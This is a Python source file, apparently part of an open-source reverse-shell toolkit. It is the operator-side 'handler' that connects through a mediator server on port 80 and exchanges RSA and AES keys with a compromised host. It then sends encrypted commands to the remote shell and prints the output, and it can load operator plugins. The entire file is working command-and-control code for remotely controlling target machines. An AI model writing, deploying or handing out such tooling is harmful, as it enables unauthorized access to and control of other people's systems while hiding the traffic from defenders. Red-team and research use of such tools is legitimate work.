#!/usr/bin/python3
"""
Program: handler.py
Author: C.J. May @lawnd0c
Description: Basic TCP stream interaction with a reverse shell -- connects to mediator server to be bridged to the reverse shell client connection
"""

import argparse
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import inspect
try:
    from . import plugins
except ImportError:
    import plugins
import select
from socket import *
import sys
import threading


class Handler:
    def __init__(self, mediatorHost="", connectionKey="#!ConnectionKey_CHANGE_ME!!!"):
        self.connectionKey = connectionKey
        self.shell = socket()
        self.shell.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        self.stopReceiving = False
        self.lastCommand = ""
        self.plugins = self.loadPlugins()
        if not mediatorHost:
            raise(ValueError("Hostname of mediator server not specified."))
        self.mediatorHost = mediatorHost
        # self.privKey, self.pubKey, self.cipherKey declared in Handler.run()

    def loadPlugins(self):
        commandClasses = inspect.getmembers(plugins, inspect.isclass)
        commandClasses.pop(0)
        externalCommands = dict()
        for className, commandClass in commandClasses:
                externalCommands[commandClass.name()] = commandClass.handler
        return externalCommands

    def tryPlugin(self, commandLine):
        argv = commandLine.split()
        if not argv:
            # newline sent -- not a plugin
            return
        command = argv[0]
        try:
            self.plugins[command](argv, self.shell, self.cipherKey)
        except KeyError:
            # command not in plugins
            pass
        return

    def sendCommands(self, readSignal):
        command = ""
        while True:
            ch = sys.stdin.read(1)
            command += ch
            if command[-1] == "\n":
                # send command to target
                cipher = AES.new(self.cipherKey, AES.MODE_EAX)
                nonce = cipher.nonce
                ciphertext, tag = cipher.encrypt_and_digest(command.encode())
                self.shell.sendall(nonce)
                self.shell.sendall(tag)
                self.shell.sendall(ciphertext)
                # check if command was a plugin -- if so, run plugin's handler code
                readSignal.clear()
                self.tryPlugin(command)
                readSignal.set()
                # record last command to not reprint from target's stdout
                self.lastCommand = command
                # close process if shell was exited
                if command == "exit\n":
                    break
                # reset input for next command
                command = ""

    def readResponses(self, readSignal):
        while True:
            # end thread if done sending commands
            if self.stopReceiving:
                break
            # wait if plugin is being run
            readSignal.wait()
            # decrypt message
            ready, _, _ = select.select([self.shell], [], [], 0)
            if ready:
                nonce = self.shell.recv(16)
                tag = self.shell.recv(16)
                ciphertext = self.shell.recv(1)
                cipher = AES.new(self.cipherKey, AES.MODE_EAX, nonce=nonce)
                response = cipher.decrypt(ciphertext)
                # print reponse if there is one
                if len(response) > 0:
                    # don't echo command that was just entered
                    if len(self.lastCommand) > 0:
                        if len(self.lastCommand) > 1:
                            self.lastCommand = self.lastCommand[1:]
                        else:
                            self.lastCommand = ""
                        continue
                    try:
                        print(response.decode(), end="", flush=True)
                    except:
                        print(".", end="", flush=True)

    def getRSA(self):
        # read RSA key if it exists, otherwise create a new one
        try:
            keyFile = open("handler.pem", "rb")
            key = keyFile.read()
            if not key:
                raise FileNotFoundError
            priv = RSA.importKey(key)
            pub = priv.publickey()
        except FileNotFoundError:
            priv, pub = self.genRSA()
        return (priv, pub)

    def genRSA(self):
        print("Generating new RSA 4096 key pair...")
        key = RSA.generate(4096)
        with open("handler.pem", "wb") as f:
            f.write(key.export_key('PEM'))
        return (key, key.publickey())

    def keyExchange(self):
        try:
            self.shell.sendall(self.pubKey.exportKey('PEM'))
            message = self.shell.recv(1024)
            cipher = PKCS1_OAEP.new(self.privKey)
            aesKey = cipher.decrypt(message)
            print("Key exchange successful...\n")
        except ValueError:
            print("ERROR: Duplicate operator waiting on server or invalid response received -- connection closed")
            print("Please change connection key or try again soon")
            sys.exit(1)
        except ConnectionResetError:
            print("ERROR: Connection timed out waiting for reverse shell")
            print("Please check connection key and try again")
            sys.exit(1)
        return aesKey

    def connect(self, mediatorHost):
        # connect to moderator on operator port
        print("Connecting to reverse shell...")
        self.shell.connect((gethostbyname(mediatorHost), 80))
        # send verification
        self.shell.sendall(self.connectionKey.encode())
        verification = self.shell.recv(1024)
        if verification.decode() != self.connectionKey:
            print("WARNING: Connection key validation failed")
            print("Server responded with the wrong key: {}".format(verification.decode()))

    def run(self):
        # connect to server and perform key exchange with target
        self.connect(self.mediatorHost)
        self.privKey, self.pubKey = self.getRSA()
        self.cipherKey = self.keyExchange()
        # start I/O threads to control the reverse shell
        readSignal = threading.Event()
        readSignal.set()
        operatorToShell = threading.Thread(target=self.sendCommands, args=[readSignal])
        operatorToShell.daemon = True
        operatorToShell.start()
        shellToOperator = threading.Thread(target=self.readResponses, args=[readSignal])
        shellToOperator.daemon = True
        shellToOperator.start()
        # wait for threads to join
        operatorToShell.join()
        self.stopReceiving = True
        shellToOperator.join()
        print("Closing connection...")
        self.shell.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reverse shell handler client to be used with a mediator server.")
    parser.add_argument("-c", "--connection-key", dest="connectionKey", action="store",
                        help="connection key to match to a reverse shell")
    parser.add_argument("-s", "--server", dest="serverAddr", action="store",
                        help="address of mediator server",
                        default="example.com")
    args = parser.parse_args()
    if args.connectionKey:
        handler = Handler(mediatorHost=args.serverAddr, connectionKey=args.connectionKey)
    else:
        handler = Handler(mediatorHost=args.serverAddr)
    handler.run()

